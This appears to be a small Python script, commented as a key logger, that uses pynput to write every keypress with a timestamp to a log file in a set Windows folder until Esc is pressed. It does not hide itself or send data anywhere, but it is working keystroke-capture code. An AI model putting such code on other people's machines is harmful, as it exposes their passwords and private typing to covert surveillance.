import logging
from pynput.keyboard import Key, Listener


#Key logger directory file path
directory = r"C:/Sample Directory"

#Logging function including date and text logged at the time
logging.basicConfig(filename= (directory + r"/logger.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(str(key))
    #Stops the listener from logging anymore characters
    if key == Key.esc:
        return False 


with Listener(on_press=on_press) as listener:
    listener.join()
